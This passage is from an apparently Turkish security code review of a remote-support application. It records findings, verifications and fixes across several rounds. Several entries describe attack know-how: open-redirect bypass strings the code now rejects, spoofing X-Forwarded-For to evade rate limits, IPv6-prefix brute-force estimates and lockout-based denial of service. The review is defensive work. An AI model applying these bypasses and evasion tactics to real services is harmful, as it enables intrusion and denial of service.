- argon2id m=19456 KiB, t=2, p=1 (OWASP); kullanıcı yoksa dummy hash ile eşit maliyet; aynı 401 metni; şifre 12-200.
- `must_change_password` sunucu guard'ında (yalnız me/logout/password-change serbest); seed Super Admin'i zorunlu değişimle oluşturuyor, parolayı ezmiyor, prod'da demo tenant yok.
- Hata zarfı stack/SQL sızdırmıyor; `bodyLimit` 64 KB; env hatası değer yazmıyor.
- Docker: non-root `node`, root sahipli salt okunur dosyalar, `read_only`, `cap_drop: ALL`, `no-new-privileges`, MySQL `internal` ağda yayınsız, `/health|/ready|/metrics` dışarı kapalı, `admin off`.

### Ajan bazında
- backend-dev: S1-2, S1-3, S1-5, S1-6, S1-7, S1-8, S1-9 (sunucu), S1-10
- frontend-dev: S1-1, S1-4, S1-9 (proxy.ts sabiti)
- devops: S1-11, `minimatch` güncellemesi

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S1-5..S1-11. S1-1..S1-3 "Sonra" değil, P2 öncesi düzeltme; S1-4 P2 giriş şartı.

## P1 kod turu — Tur 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 3 (yeni). S1-1..S1-11'in 11'i de kapandı.

### S1 doğrulama tablosu
| ID | Sonuç | Kanıt |
|---|---|---|
| S1-1 | Kapandı | web/lib/api.ts:88-113 kontrol karakteri + `\` (ham ve çözülmüş), herhangi bir yerde `//` reddi, son karar `new URL(next, origin).origin` karşılaştırması; login-form.tsx:45 `window.location.origin` geçiyor. `/\t/x`, `%09`, `/%2F/x` reddediliyor |
| S1-2 | Kapandı | repo.ts:40-53 tek ifadeli koşullu `UPDATE` (satır kilidi altında okuma+yazma) → kayıp güncelleme yok. Yan etki: S2-3 |
| S1-3 | Kapandı (kısmen kabul) | service.ts:115-134 diğer oturumlar aynı TX'te iptal; oturum başına 5 hatalı `current` → oturum iptal + 401, sayım doğrulamadan önce. Token yenilenmemesi: S2-2 |
| S1-4 | Kapandı | proxy.ts:11-15 önek eşleşmesi; :43 `next` yalnız pathname, `/session/` hiç yazılmıyor. `/session/` yalnız çerez ön elemesini atlıyor, yetki yine sunucuda (layout `getMe`) |
| S1-5 | Kapandı | olmayan hesap için `ghostAccount` aynı 20/sa kuralını uyguluyor (service.ts:36, :49, :62); kilitli dalda da argon2. Yan etkiler: S2-1, S2-4 |
| S1-6 | Kapandı | service.ts:75 `hit` await'ten önce, senkron |
| S1-7 | Kapandı | mask.ts:31 izinli anahtarın nesne/dizi değeri de `maskValue` ile özyineleniyor |
| S1-8 | Kapandı | repo.ts:31-34 `@` varsa yalnız e-posta, yoksa yalnız username, `findUnique`. Username'de `@` yasağı P9'da contracts'a girmeli (izlenecek) |
| S1-9 | Kapandı | contracts auth.ts:59-60 `__Host-rs_session`, `__Host-rs_csrf`; Secure, Path=/, Domain yok (routes.ts:17); `clearCookie` aynı özniteliklerle (öneki geçerli siler); proxy.ts sabiti contracts'tan |
| S1-10 | Kapandı, gerekçe kabul | routes.ts:39-53 hata durumunda yalnız çerezler temizleniyor, sunucu oturumu iptal edilmiyor. Çapraz siteden gelen yanıttaki SameSite=Strict `Set-Cookie` tarayıcıca uygulanmaz; en kötü sonuç kendi tarayıcıda çıkış. Yeni girişte eski oturum iptal ediliyor (service.ts:94) |
| S1-11 | Kapandı | ci.yml:136 `gitleaks:v8.30.1@sha256:…`; Dockerfile/compose base imajları digest'li; `minimatch` override sonrası `pnpm audit --audit-level=moderate` → **No known vulnerabilities found** (bu turda yeniden çalıştırıldı) |

### Yeni bulgular
#### S2-1 [ORTA] Bellek içi sayaçlarda sınır yok ve temizlik her istekte O(n) — A04 (DoS)
Yer: apps/server/src/lib/rate.ts:33-36, :52-55; yeni tüketici service.ts:36 `ghostAccount` (anahtar = saldırganın seçtiği login, ≤190 karakter, 60 dk pencere)
Tehdit: her rastgele login değeri `ghostAccount`'ta ve `pair`'de (`login|ip`) birer kayıt açar. Kayıt sayısı 10.000'i geçince
`sweep` her `hit`'te tüm haritayı dolaşıyor, ancak 60 dk dolmadığı için hiçbir kaydı silemiyor. IP başına 20/dk ile ~9 IP
10.000 eşiğini aşar; ~1.000 IP ile ~1,2 M kayıt (yüzlerce MB) oluşur ve her giriş isteği olay döngüsünü onlarca ms kilitler.
Sonuç: tüm API yavaşlar, bellek dolar (OOM ile yeniden başlama sayaçları da sıfırlar).
Öneri: `FixedWindowCounter`'a `maxEntries` (ör. 50.000; dolunca en eski kayıt atılır — Map ekleme sırası, LRU) ve zamanlı
temizlik (`setInterval` 60 sn, `unref`) ekle; her `hit`'te tam tarama yapılmasın. `ghostAccount` anahtarı `sha256(login)`
olsun (sabit 64 B). Birim test: 100k farklı anahtarda bellek ve `hit` süresi sınırlı kalmalı. Atanan: backend-dev
#### S2-2 [DÜŞÜK] Şifre değişiminde mevcut oturum token'ı yenilenmiyor — A07
Yer: apps/server/src/auth/service.ts:128-134, routes.ts:55-59
Gerekçenin değerlendirmesi: **kısmen kabul.** Saldırganın ayrı bir oturumu varsa (şifreyi bilen ya da başka cihaz) iptal ediliyor,
bu doğru. Ama token çalınmasında (XSS, zararlı yazılım, ileride log/yanlış yapılandırma) saldırgan kurbanla **aynı** oturumu
paylaşır. Kurban "bir şey ters" diye şifresini değiştirdiğinde bu oturum "diğer" sayılmaz, saldırgan 8 sa'e kadar içeride kalır.
OWASP Session Management önerisi kimlik bilgisi değişiminde oturumun yenilenmesidir. P10 `logout-all` kullanıcının bilinçli
eylemine bağlıdır, otomatik koruma değildir. HttpOnly + 30 dk boşta süresi riski sınırladığı için şiddet Düşük.
Öneri: başarılı değişimde aynı TX'te mevcut oturumu da iptal et, `openSession` ile yeni token + CSRF üret ve `setSessionCookies`
çağır (login'deki kod yolu; ~10 satır). Test: değişimden sonra eski çerezle `/auth/me` → 401, yeni çerezle 200. Atanan: backend-dev
#### S2-3 [DÜŞÜK] Hedef hesapta satır kilidi çekişmesi — A04
Yer: apps/server/src/auth/repo.ts:41-51 (UPDATE + gereksiz `SELECT … FOR UPDATE` + UPDATE, audit INSERT aynı TX'te, service.ts:50-58)
Tehdit: çok IP'den tek hesaba eşzamanlı yanlış şifre gönderilince bütün TX'ler aynı `users` satırında sıraya girer. Her TX kısa
sürdüğü için kilitlenme (deadlock) beklenmez: tek satır, tek sıra. Ancak yüksek hacimde Prisma bağlantı havuzu bekleyen TX'lerle
dolup diğer istekleri de geciktirebilir. IP limiti (20/dk) bunu sınırlıyor.
Öneri: `FOR UPDATE` kaldırılsın (UPDATE zaten satırı kilitler; okuma aynı TX'te düz SELECT ile yeterli) veya eşik kontrolü tek
ifadeye alınsın (`locked_until = IF(count+1 >= limit, …)`); audit INSERT kilitten sonra ayrı yazılabilir. Yük testi: tek hesaba
500 eşzamanlı istekte başka bir kullanıcının girişi p95 < 1 sn kalmalı. Atanan: backend-dev
#### S2-4 [DÜŞÜK] Hayalet hesap sayacı yeniden başlatmada sıfırlanıyor (kabul edilen risk) — A07
Yer: service.ts:36 (bellek) ↔ var olan hesapta DB `locked_until`
Değerlendirme: kilit penceresi içinde süreç yeniden başlarsa var olan hesap 423, olmayan hesap 401 döner; hesabın varlığı
anlaşılabilir. Saldırgan yeniden başlatmayı kendisi tetikleyemez; S2-1 düzelmezse OOM ile tetikleyebilir, dolayısıyla S2-1'e
bağlı. ADR-0005 (tek instance, bellek) ile tutarlı. Ayrıca düzeltme gerekmez, S2-1 ile birlikte kapanır. Atanan: —

### Diğer kontroller (yeni açık yok)
- Boş gövdeli JSON ayrıştırıcısı (app.ts:91-95): dolu gövde Fastify'ın prototip zehirlemesine karşı korumalı varsayılan ayrıştırıcısına gidiyor; boş gövde `undefined` → zod `{}`. Sorun yok.
- Kilitli dalda argon2 çalıştırılması, kilitli hesaba istek yağdırıldığında CPU maliyeti getiriyor; IP limiti 20/dk ile sınırlı ve S1-5 için gerekli. Kabul.
- Şifre değişimi sayacı oturum kimliği anahtarlı; boyutu oturum sayısıyla sınırlı.

### Ajan bazında
- backend-dev: S2-1 (P2 öncesi önerilir: P2/P3 aynı `FixedWindowCounter`'ı public uçlarda kullanacak), S2-2, S2-3
- frontend-dev, devops: yeni bulgu yok

Öneri (`docs/gereksinimler.md` §9 "Sonra"): S2-3, S2-4. S2-1, P2'deki public resolve/join limitlerinden önce kapatılmalı. S2-2 küçük iş, P2 ile birlikte yapılmalı.

## P1 kod turu — Tur 3
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (S3-1, kabul edilen kalan risk). S2-1, S2-2, S2-3 kapandı; S2-4 S2-1 ile birlikte kapandı.

### S2 doğrulama
| ID | Sonuç | Kanıt |
|---|---|---|
| S2-1 | Kapandı | rate.ts:53-71 `hit` O(1), `maxEntries` 50.000, dolunca en eski kayıt atılıyor; `prune` istek yolunda değil, 30 sn'lik `unref`'li zamanlayıcıda (:34-38, :78-81); `onClose`'da durduruluyor (app.ts:86). Anahtarlar `sha256(login)` (service.ts:51, :64, :75), bellek ≈ 50k × sayaç sayısı × ~200 B, sınırlı |
| S2-2 | Kapandı | service.ts:136-138 mevcut dahil tüm oturumlar iptal, yeni oturumun bitişi eskisininkini aşmıyor; routes.ts:57 yeni `__Host-` oturum + CSRF çerezi. web lib/api.ts CSRF'i her istekte çerezden okuyor, frontend tarafında ek iş yok |
| S2-3 | Kapandı | repo.ts `bumpAccountFailures` tek `UPDATE` (MySQL tek tablo atamaları soldan sağa güncel değerle); `FOR UPDATE` yok. Eşzamanlı ikinci istek pencereyi 1'den başlatıyor ama `locked_until` korunuyor ve kilit kaydı bir kez yazılıyor; kilit sonrası pencere NULL olduğu için sayaç 1'den başlıyor. Doğru |
| S2-4 | Kapandı | OOM tetikleyicisi kalktı; restart'ta sıfırlanma ADR-0005 kapsamında kabul |

### S3-1 [DÜŞÜK] Sınır dolunca etkin kilit kaydı atılabilir — kalan risk KABUL EDİLDİ — A07
Yer: apps/server/src/lib/rate.ts:59-62
Değerlendirme: ~170 IP ile 15 dk'da 50.000 yeni hesap+IP anahtarı üretilirse saldırganın kendi kilit kaydı atılabilir ve hesap+IP
sınırı (5/15 dk) aşılır. Bu tek başına kaba kuvvet denemesine kapı açmıyor, çünkü:
(1) var olan hesapta asıl sınır **DB'deki hesap geneli kilit** (20/sa, artık atomik), bellekteki atma bunu etkilemiyor;
(2) IP sayacı (20/dk) ayrı bir örnek ve anahtarı IP; atılması için ~50.000 IP gerekir;
(3) olmayan hesapta (`ghostAccount`) atma yalnız 423/401 tutarlılığını bozar: düşük değerli numaralandırma, büyük trafik ister.
Sonuç: P1 için kabul edilebilir.
En basit iyileştirme (Sonra, ~5 satır): atarken kilidi etkin olan kaydı atlamak. En eskiden başlayarak en çok 32 kayda bak; ilk
`blockedUntil <= now` olanı sil. Hepsi kilitliyse yeni kaydı ekleme ve isteği "kilitli" say (fail-closed); bu yalnız yoğun
saldırı altında devreye girer. Yük testi: sınır doluyken etkin kilit kaydı korunmalı.
**P2/P3 notu:** public resolve/join limitlerinde DB'de bir yedek sınır yok; bu sınıf orada kullanılırsa iyileştirme o paketin
giriş şartı olsun (G-02).
Atanan: backend-dev (Sonra; P2 public limitlerinden önce)

### P1 güvenlik kapanışı
S1 (11) + S2 (4) bulgunun hepsi kapandı veya gerekçesiyle kabul edildi. Açık Kritik/Yüksek yok → P1 güvenlik açısından **GEÇTİ**.
`docs/gereksinimler.md` §9 "Sonra" önerisi: S3-1 (P2 öncesi), S1-8 username `@` yasağı (P9).

## P2 kod turu
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 6 (+ P3 giriş şartı notu). Düşüklerin hepsi "Sonra" olabilir; S-P2-3 ve
S-P2-5 P3 öncesinde kapanmalı.

### S3-1 doğrulama (P1'den kalan şart)
Kapandı: `apps/server/src/lib/rate.ts:57-68`, kilidi süren kayıt atılmıyor (en çok 32 kayda bakılıyor), hepsi kilitliyse
`hit` true dönüyor (fail-closed). P2 public limitleri aynı sınıfı kullanıyor (`sessions/public.ts:26-31`).

### Bulgular (öncelik sırasıyla)

#### S-P2-1 [DÜŞÜK] Web, müşteri sayfasında resolve yaparken gelen X-Forwarded-For'u olduğu gibi iletiyor; edge ağından taklit edilebilir — A01/A04
Yer: apps/web/app/session/[token]/page.tsx:26, apps/web/lib/server-api.ts:93, deploy/docker-compose.yml:87 (`TRUSTED_PROXY_CIDR 172.30.0.2/31`)
Sorun: Server `.3`'ü (web) güvenilen proxy sayıyor. Web ise gelen `x-forwarded-for` başlığını doğrulamadan iletiyor.
Caddy'den gelen istekte bu sorun değil: Caddy'de `trusted_proxies` yok, istemcinin gönderdiği XFF eziliyor. Ama web:3000'e
edge ağından doğrudan gelen bir istek istediği IP'yi yazabiliyor.
İstismar senaryosu: Caddy'de RCE bulan ya da edge ağına eklenen bir konteyner, `GET http://172.30.0.3:3000/session/<x>`
isteğini her seferinde farklı `X-Forwarded-For` ile atar. (a) Token yolunun 30/dk/IP sınırı fiilen kalkar. Token 256 bit
olduğu için tahmin yine pratik değil. (b) `session.resolve` audit satırlarına (410 durumları) sahte `ip_address` yazılır.
Kod yolu bu sayfadan geçmediği için 8 haneli kodun kaba kuvvetle denenmesine yol açmıyor. `next.config.ts:16` rewrite'ı
(http-proxy `xfwd`) kendi bağlantı adresini sona eklediği için o yol taklit edilemiyor. Ön koşul edge ağının ele
geçirilmesi olduğundan önem Düşük.
Düzeltme (devops): Edge ağında yalnız caddy, web ve server kalmalı; compose'a "edge'e servis eklenmez" yorumu ve runbook
notu eklenmeli. Kesin çözüm (Sonra): Caddy `reverse_proxy web:3000 { header_up X-Edge-Auth {env.EDGE_SHARED_SECRET} }`.
Web, bu başlık eşleşmezse XFF iletmemeli. Alternatif: web yalnız XFF'in son öğesini iletmeli (taklidi tek değere indirir,
tamamen kaldırmaz).

#### S-P2-2 [DÜŞÜK] Web'den yapılan resolve User-Agent iletmiyor; audit'te `user_agent` boş ya da "node" — A09
Yer: apps/web/lib/server-api.ts:88-93; server tarafı apps/server/src/audit/service.ts:29
Sorun: `session.resolve` (fail/410) ve resolve sırasında yapılan `session.expired` kayıtlarındaki `user_agent`, müşterinin
tarayıcısını değil Node fetch'i gösteriyor. Ortak standart §1.1 bu alanı zorunlu tutuyor.
İstismar senaryosu: Yok. Olay incelemesinde müşteri ile saldırganın istemcisi ayırt edilemiyor.
Düzeltme (frontend-dev): `resolveSessionToken`'a `user-agent` parametresi eklenmeli, `h.get("user-agent")` değeri en çok
512 karaktere kesilip iletilmeli. Bu değer yalnız bilgi amaçlı, güven kararlarında kullanılmamalı.

#### S-P2-3 [DÜŞÜK] Global `resolve_failed` sayacı/alarmı (G-02) kodda yok; dağıtık kod denemesi görünmüyor — A09/A04
Yer: apps/server/src/sessions/public.ts:66-73 (başarısız kod yalnız ip/önek sayacına giriyor; metrik ve log yok); vaat:
docs/mimari.md:179, :338, docs/mimari-api.md:87
Sorun: IP/önek limitleri tek kaynağa karşı doğru çalışıyor. Ama çok sayıda önekten gelen saldırı hiçbir yerde
görünmüyor. Hesap şöyle: /56 başına yaklaşık 30 hata / 16 dk. Tek bir IPv6 /48 (256 adet /56, tunnel broker ile ücretsiz)
dakikada yaklaşık 480 deneme yapar. 100 bekleyen oturumda bir denemenin tutma olasılığı 10⁻⁶, yani /48 başına beklenen
süre yaklaşık 35 saat. Bu süre önek sayısıyla doğrusal kısalır.
İstismar senaryosu: Kodu tutturan saldırgan bugün (P2) `tenant.name`, `technician.name` ve `techVerifyCode` bilgilerini
alıyor (public.ts:87-93). Bunlar hedefli telefon dolandırıcılığı için malzeme. Oturumu ele geçirmek P3'teki lobi ve
`admitCode` kapısına bağlı.
Düzeltme (backend-dev, P3 öncesi): Başarısız kod için süreç içi bir sayaç tutulmalı (`resolve_failed_total`, dakikalık
pencere). Eşik (100/dk) aşılınca `warn` log atılmalı (IP yazılmadan, yalnız sayı ve önek sayısı). /metrics P13'te bu
sayaca bağlanmalı. Engelleme yapılmamalı (G-02: global alarm olarak kalır).

#### S-P2-4 [DÜŞÜK] Önek (/24) kilidi CGNAT arkasındaki müşterileri birlikte kilitleyebilir — A04 (tasarımda kabul edilmiş kalan risk)
Yer: apps/server/src/sessions/public.ts:27-28, :63-71; apps/server/src/lib/ip.ts:24-31
Sorun: Mobil operatör CGNAT'larında binlerce abone aynı /24'ü paylaşıyor. Aynı havuzdaki bir kişi dakikada 31 hatalı kod
girerse o önekteki herkesin kod girişi 15 dk 429 alır. Link (token) yolu etkilenmiyor.
İstismar senaryosu: Rakip ya da kötü niyetli biri aynı operatörün mobil verisinden betik çalıştırır, o bölgedeki
müşteriler kodla bağlanamaz.
Düzeltme (backend-dev/frontend-dev, Sonra): 429 ekranında "Size gönderilen bağlantıyı kullanın" yönlendirmesi olmalı
(guest-ui `rate`). S-P2-3'teki sayaç önek bazında 429 sayısını da raporlamalı. Tasarım değişikliği gerekmiyor.

#### S-P2-5 [DÜŞÜK] Staging'de Caddy'nin gerçek istemci IP'sini gördüğü doğrulanmadı (Docker userland-proxy / IPv6) — A05
Yer: deploy/docker-compose.yml (caddy `ports`, edge ağı yalnız IPv4)
Sorun: IPv4'te iptables DNAT kaynak adresi korur. Ancak host IPv6 dinliyorsa ve ağ yalnız IPv4 ise, Docker
`docker-proxy` (userland-proxy) bağlantıyı aktarır ve tüm IPv6 istemciler `172.30.0.1` olarak görünür. Bu durumda tüm
IP/önek limitleri tek bir ortak kovaya düşer: bir kişinin 10 hatası herkesi 15 dk kilitler.
İstismar senaryosu: IPv6 ile bağlanan saldırgan 11 hatalı kod girer, IPv6 ile gelen tüm müşterilerin kod girişi kilitlenir.
Düzeltme (devops, P3 öncesi): Staging'de `docker compose logs caddy` çıktısında `request.remote_ip` alanı gerçek dış IP
olmalı; IPv4 ve IPv6 ayrı ayrı denenmeli. `172.30.0.1` görünüyorsa iki yol var: ya `"userland-proxy": false` ile birlikte
edge ağında IPv6 açılmalı (`enable_ipv6`), ya da yayın yalnız IPv4'e bağlanmalı (`0.0.0.0:4450:4450`). Sonuç runbook'a yazılmalı.

#### S-P2-6 [DÜŞÜK] Token yolundaki her 410 yanıtı bir audit satırı yazıyor; audit şişirilebilir — A04
Yer: apps/server/src/sessions/public.ts:51-53, :82-85
Sorun: Bitmiş bir oturumun linkine sahip olan herkes, her yenilemede `session.resolve/fail` satırı üretiyor. Sınır
30/dk/IP; birden çok IP ile sınırsız.
İstismar senaryosu: Sızmış eski bir link botnet'e verilir, audit tablosu ve ekranı gürültüyle dolar, gerçek olaylar
kaybolur.
Düzeltme (backend-dev, Sonra): Aynı `entity_id` + `reason` için 10 dk içinde tek satır yazılmalı (bellek içi
`FixedWindowCounter` ile). Ya da 410'lar audit yerine yalnız sayaç/log olarak tutulmalı.

#### S-P2-7 [BİLGİ] Küçük sertleştirmeler
- apps/server/src/env.ts:30: `SESSION_REF_KEY` production'da opsiyonel; zorunluluğu yalnız compose sağlıyor. Compose
  dışında çalıştırılırsa sessizce süreç başına rastgele anahtar üretiliyor. `TRUSTED_PROXY_CIDR`'deki `refine` gibi
  production'da zorunlu yapılmalı (backend-dev).
- apps/web/next.config.ts:15-16: `/api` rewrite production'da da açık; Caddy `/api/*`'yi önce yakaladığı için dışarıdan
  ulaşılamıyor, ama gereksiz bir ikinci yol. `NODE_ENV !== "production"` koşuluna bağlanmalı (frontend-dev).
- Kod yolunda süresi geçmiş ama iş tarafından henüz süpürülmemiş bir kod (≤30 sn) 410 döndürüyor ve başarısız sayılmıyor
  (public.ts:77-80). Etkisi ihmal edilebilir; yalnız kayda geçsin.

### P3 giriş şartları (bu turdan doğan)
1. `sessionRef` süresiz geçerli ve tarayıcı JS'inde/sorgu dizesinde duruyor. P3/P6'da `GET /public/agent/download?ref=`
   dosya adına kodu (`Destek-<kod>.exe`) yazacağı için ref kodla eşdeğer bir gizli değer olur. Bu uç da kod yolu gibi
   limitlenmeli ve yalnız PENDING durumda yanıt vermeli.
2. P3 join/admit: tüketim `UPDATE ... WHERE status='PENDING' AND expires_at > now` tek ifadede yapılmalı, iptal/expiry
   ile yarışta tek kazanan olmalı (P2'deki kalıp, repo.ts:86-101, doğru ve örnek alınmalı).
3. Agent (P6) public resolve'da `Origin` göndermek zorunda (routes.ts:61). Agent için ayrı ve belgelenmiş bir Origin
   değeri ya da `clientKind=AGENT` için Origin muafiyeti kararı verilmeli.

### Otomatik tarama çıktıları
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- gitleaks: bu makinede kurulu değil (CI'da çalışıyor). Yerine regex ile gizli değer taraması yapıldı (node_modules, .next,
  generated, test ve e2e hariç): eşleşme yok. Kökte yalnız `.env.example` var; `SESSION_REF_KEY=` ve
  `TRUSTED_PROXY_CIDR=` boş.
- `git log -- '*.env*'`: dizin git deposu değil, geçmiş taranamadı.

### Tasarımda vaat edilip kodda bulunmayanlar
- G-02 / mimari §338 global `resolve_failed` alarmı: yok (S-P2-3).
- Bunun dışında P2'nin vaat ettiği kontrollerin hepsi kodda bulundu (aşağıda).

### Olumlu
- Token: `randomBytes(32)` base64url, 256 bit (lib/ids.ts:8). DB'de yalnız `sha256` (service.ts:80; CHECK
  `token_hash_fmt_chk`). Düz token yalnız create yanıtında (`link`), `no-store` ile (routes.ts:38); GET/list link döndürmüyor.
- Kod: `randomInt` CSPRNG ile 8 hane. `active_code` UQ global tekil, çakışmada TX 5 kez yeniden deneniyor. CHECK
  `code_pending_chk` sayesinde kod PENDING dışında DB düzeyinde NULL. `toView` PENDING dışında kodu göstermiyor
  (service.ts:35).
- sessionRef: HMAC-SHA256(key, id) + id, `safeEqual` ile sabit süreli ve uzunluk sızdırmayan karşılaştırma
  (codes.ts:21-25, ids.ts:13-15). Biçimsiz veya yanlış ref 404. Status yanıtı yalnız `{status}`.
- Enumeration: kod yolunda yalnız PENDING bulunabiliyor, 404 ile 410 farkı yalnız token sahibine durum bildiriyor (link
  sahibi meşru taraf). Biçimsiz id 404 (routes.ts:25-29).
- Limitler: başarısız kod ip 10/dk + önek 30/dk, 15 dk blok; token 30/dk; status 60/dk. Kontrol DB'ye gitmeden önce yapılıyor.
  Sayaçlar 50k kayıtla sınırlı ve fail-closed.
- Yarış: iptal ve expiry tek koşullu `updateMany` (status='PENDING' + expires_at). Oluşturmada teknisyen satırı
  `FOR UPDATE` ile açık oturum ve saatlik limit serileştiriliyor (repo.ts:37-39).
- Yetki/IDOR: her sorgu `tenantId` kapsamında. USER yalnız kendi oturumunu görüyor (`technicianId` kapsamı filtreyi
  eziyor, repo.ts:73-76). Başka tenant veya başkasının oturumuna GET/cancel 404 dönüyor. Create başka tenant'ta FORBIDDEN
  (service.ts:58). İzinler sessions.create/view/delete (mimari-api ile uyumlu).
- CSRF: teknisyen POST'larında double-submit + Origin (guards.ts:17-22). Public resolve'da Origin allowlist var, çerez
  kullanılmıyor.
- Sızıntı: pino URL'de sorgu dizesini atıyor, `/session/***` maskeleniyor, `*.token` redakte ediliyor (logger.ts).
  Caddy logu sorgu, `/session/…`, Cookie, Referer ve Location alanlarını siliyor. `next=` /session/ yollarına
  yazılmıyor (proxy.ts:43). Sayfada `referrer: no-referrer` ve `noindex`, proxy'de `Referrer-Policy: no-referrer` var.
  Token istemci JS'ine verilmiyor, istemci yalnız ref ile yokluyor.
- SSRF yok: web, sabit `API_INTERNAL_URL`'e regex ile doğrulanmış token'ı JSON gövdede gönderiyor. Link
  `PUBLIC_BASE_URL`'den kuruluyor, Host başlığından değil.
- CSP: nonce + `strict-dynamic`, `unsafe-inline` yok, `frame-ancestors 'none'`, `base-uri 'none'`, `object-src 'none'`.
- DB: `app` kullanıcısında support_sessions için yalnız SELECT/INSERT/UPDATE var, DELETE/DDL yok (grants.sql:18-19).
  CHECK kısıtları durum, ended_at ve TTL (15-30 dk) için ikinci savunma hattı.
- Ağ: web ve server port yayımlamıyor, db ağı `internal`. Güvenilen CIDR /31 tam olarak caddy ve web'i kapsıyor,
  dinamik aralık (.128/25) dışında.

### Öneri: `docs/gereksinimler.md` §9 "Sonra"
S-P2-1 (Caddy-web paylaşılan sır), S-P2-2, S-P2-4, S-P2-6, S-P2-7. **P3 öncesi kapanmalı:** S-P2-3, S-P2-5 ve
"P3 giriş şartları" 1-3.

## P2 Tur 2
DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (+2 bilgi notu). Kapanan: S-P2-1, S-P2-2, S-P2-3, S-P2-6, S-P2-7.
Açık kalan (kapsam gereği): S-P2-4 (metin düzeltildi, sunucu davranışı P3), S-P2-5 (P3 öncesi staging'de) ve P3 giriş şartları.

### Düzeltme doğrulaması
- **S-P2-1 — kapandı.** `caddy adapt` (caddy:2.11.9) çıktısı: web bloğu `headers.request.set{"X-Edge-Auth"}`
  (*set* = istemcinin aynı ad başlığını ezer), `/api/*` ve `/ws/*` blokları `delete X-Edge-Auth` (sır server'a gitmez).
  Web'e giden tek blok `handle` (Caddyfile:79-87); `@ops` 404. Üç reverse_proxy'de de `trusted_proxies` yok, yani Caddy
  gelen XFF'i yok sayıp tek değer (soket adresi) yazar. Web ilk öğeyi alıp `isIP` ile doğruluyor (edge-forward.ts:43-46),
  bu Caddy davranışıyla tutarlı. Karşılaştırma iki SHA-256 özeti üzerinde `timingSafeEqual` ile yapılıyor; uzunluk
  sızmıyor, boş değer reddediliyor (edge-forward.ts:19-24). Sır üç yerde de loglanmıyor: Caddy log filtresi
  `request>headers>X-Edge-Auth delete` (Caddyfile:42); web başlığı server'a iletmiyor (`forwardHeaders` yalnız XFF ve UA
  döndürüyor); server pino serileştiricisi yalnız method ve maskeli url yazıyor (logger.ts:39). Compose sırrı hem caddy
  hem web için `:?` ile zorunlu tutuyor (docker-compose.yml:110,127). `EDGE_PROXY_SECRET`'in `NEXT_PUBLIC_` öneki yok,
  `node:crypto` kullandığı için istemci paketine de giremez.
- **S-P2-2 — kapandı.** UA 512'ye kesiliyor (web), server audit'te 300'e kesiyor (audit/service.ts:44). Başlık enjeksiyonu
  mümkün değil: gelen başlık değerinde CR/LF olamaz (Node ayrıştırıcısı reddeder), undici `Headers` da reddeder.
  Gelen değerler latin1 olduğu için `slice` geçersiz bayt üretmiyor.
- **S-P2-3 — kapandı.** `ResolveFailedAlarm` (public.ts:37-74): tek sayaç + en çok 10.000 önek tutan Set, pencere
  başında temizleniyor. Alarm pencere başına bir kez tetikleniyor. Log içeriği yalnız `{failed, prefixes(sayı), windowSec}`,
  IP/önek/kod yazılmıyor. İstek engellenmiyor (G-02 ile uyumlu).
- **S-P2-6 — kapandı.** `goneAudit` (public.ts:113-117) anahtarı `sessionId:code`, sayaç limiti 2, pencere 10 dk: ilk
  olay yazılıyor, sonrakiler atlanıyor. Sayaç 50k kayıtla sınırlı. Anahtar üretmek için geçerli bir oturum token'ı/kodu
  gerekiyor, saldırgan sayacı dolduramıyor. Audit satırında token ve kod yok.
- **S-P2-7 — kapandı.** `env.ts:37-40` production'da `SESSION_REF_KEY` olmadan açılışı durduruyor (min 32).
- **Regresyon:** `repo.countOpen` artık ACTIVE + süresi dolmamış PENDING oturumları sayıyor (repo.ts:46-50). Süresi dolmuş
  PENDING kayıt limiti doldurmuyor, `FOR UPDATE` serileştirmesi korunuyor. Bir sorun görmedim. `lib/api.ts`
  `isUnauthenticated`/`EXPIRED_LOGIN_PATH` sabit bir yol kullanıyor; `next=` üretmediği için açık yönlendirme yüzeyi
  oluşmuyor.

### Bulgular
#### S-P2-T2-1 [DÜŞÜK] Edge sırrı yanlış yapılandırılırsa hata çalışma anında ortaya çıkıyor; tüm müşteriler tek IP limitini paylaşır — A05
Yer: apps/web/lib/server-api.ts:90 (`readEdgeSecret()` istek başına çağrılıyor), apps/web/lib/edge-forward.ts:30-37
Sorun: Production'da sır yoksa veya kısaysa web açılmaya devam ediyor; hata yalnız müşteri sayfası istendiğinde (500)
çıkıyor. Caddy ile web'deki sır farklıysa (biri yenilenip diğeri yeniden yaratılmadıysa) hata da çıkmıyor: XFF sessizce
iletilmiyor ve tüm müşteriler web IP'si (`172.30.0.3`) altında sayılıyor.
İstismar senaryosu: Sırlar uyuşmazken bir saldırgan dakikada 11 hatalı kod denemesi yapar. Bu, `172.30.0.3` ipKey'ini
15 dk kilitler. Kilit süresince hiçbir müşteri kod ile bağlanamaz (DoS). Token yolu da 30/dk'lık ortak sınıra düşer.
Runbook:103 belirtiyi ve tanıyı anlatıyor ama durumu kendiliğinden fark eden bir şey yok.
Düzeltme: (a) Web açılışında `readEdgeSecret()` çağrılsın (`instrumentation.ts` `register()`); sır yoksa süreç
başlamasın. (b) Server'da `ctx.ip === <web adresi>` olan public resolve için `log.warn` (oranı sınırlı) yazılsın ya da
metrik sayılsın; böylece uyuşmazlık görünür olur. (atanan ajan: frontend-dev (a), backend-dev (b)) — "Sonra" önerilir.

#### Bilgi notları (bulgu değil)
- `goneAudit` sayacı 50k kilitli kayıtla dolarsa `hit` true döner ve 410 audit'i atlanır (limit için fail-closed,
  audit için fail-open). Dolması için 50k farklı bitmiş oturumun geçerli token'ı gerekir, pratikte olmaz.
- `apps/web/lib/server-api.ts`'de `import "server-only"` yok. `node:crypto`, `next/headers` ve `cookies` içe aktarımları
  istemci paketine girmeyi zaten engelliyor; açık niyet için eklenmesi önerilir.

### Otomatik tarama çıktıları (Tur 2)
- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found.**
- gitleaks v8.30.1 (`dir`, `.gitleaks.toml` ile, node_modules/.next hariç kopya, göreli yol): **no leaks found.**
  e2e sırrı (`playwright.config.ts:29`) ve CI sırrı (`ci.yml:100`) `generic-api-key` kuralını tetiklemiyor (düşük
